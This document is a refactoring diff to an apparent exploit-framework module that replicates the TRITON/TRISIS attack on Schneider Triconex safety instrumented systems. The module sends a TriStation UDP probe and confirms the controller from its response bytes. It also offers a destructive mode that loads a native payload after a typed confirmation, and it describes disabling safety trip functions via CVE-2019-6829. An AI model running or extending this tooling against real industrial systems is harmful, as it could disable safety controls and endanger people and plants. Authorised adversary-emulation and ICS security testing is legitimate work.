@@ -150,7 +150,7 @@ class Exploit(Exploit):
             print_error("Set 'target' option first.")
             return
 
-        hex_probe = " ".join("{:02X}".format(b) for b in _TS_READ_INFO)
+        hex_probe = " ".join(f"{b:02X}" for b in _TS_READ_INFO)
 
         if self.simulate:
             print_warning("\n[TRITON/TRISIS TTP] Schneider Triconex Safety System attack replica\n")
@@ -164,19 +164,16 @@ class Exploit(Exploit):
             print_info("")
             print_info("Attack phases:")
             for phase_name, phase_desc in _TRITON_ATTACK_PHASES:
-                print_info("  [{}] {}".format(phase_name, phase_desc))
+                print_info(f"  [{phase_name}] {phase_desc}")
             print_info("")
             DestructiveGate.print_simulation(
                 description=(
                     "[TRITON TTP] Would send TriStation READ_STATUS probe to Triconex at "
-                    "{target}:{port}/UDP using the hardcoded engineering key (CVE-2019-6829). "
+                    f"{self.target}:{self.port}/UDP using the hardcoded engineering key (CVE-2019-6829). "
                     "Full attack would: enumerate controller, read SIS logic, "
                     "inject modified safety program disabling trip functions, "
                     "and persist in firmware. Physical process could run unchecked. "
-                    "Saudi Arabia TASNEE facility — 2017 (closest real-world analogue to SIS cyberattack).".format(
-                        target=self.target,
-                        port=self.port,
-                    )
+                    "Saudi Arabia TASNEE facility — 2017 (closest real-world analogue to SIS cyberattack)."
                 ),
                 payload_hex=hex_probe,
                 payload_human="TriStation READ_STATUS probe (FC=0x04, magic=0x1000)",
@@ -200,8 +197,8 @@ class Exploit(Exploit):
                 if self.destructive:
                     def _confirm():
                         try:
-                            ans = input("  Type 'EXECUTE TRITON AGAINST {}: ".format(self.target))
-                            return ans.strip() == "EXECUTE TRITON AGAINST {}".format(self.target)
+                            ans = input(f"  Type 'EXECUTE TRITON AGAINST {self.target}: ")
+                            return ans.strip() == f"EXECUTE TRITON AGAINST {self.target}"
                         except (EOFError, KeyboardInterrupt):
                             return False
                     NativePayloadLoader.execute_native(
@@ -215,7 +212,7 @@ class Exploit(Exploit):
 
         # Real probe execution (TTP-only, no native payload)
         print_warning(
-            "[TRITON TTP] Probing Triconex at {}:{}/UDP ...".format(self.target, self.port)
+            f"[TRITON TTP] Probing Triconex at {self.target}:{self.port}/UDP ..."
         )
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -224,9 +221,9 @@ class Exploit(Exploit):
             try:
                 data, addr = sock.recvfrom(512)
                 sock.close()
-                hex_resp = " ".join("{:02X}".format(b) for b in data)
+                hex_resp = " ".join(f"{b:02X}" for b in data)
                 print_success(
-                    "TriStation response from {} ({} bytes): {}".format(addr[0], len(data), hex_resp)
+                    f"TriStation response from {addr[0]} ({len(data)} bytes): {hex_resp}"
                 )
                 if data[0:2] == bytes([0x10, 0x00]):
                     print_success("TriStation magic confirmed — Triconex controller is reachable.")
@@ -236,8 +233,8 @@ class Exploit(Exploit):
                     )
                 else:
                     print_info("Non-standard response — may not be Triconex or port is filtered.")
-            except socket.timeout:
+            except TimeoutError:
                 sock.close()
                 print_status("No TriStation response (timeout) — device may be absent or filtered.")
         except Exception as exc:
-            print_error("Error: {}".format(exc))
+            print_error(f"Error: {exc}")
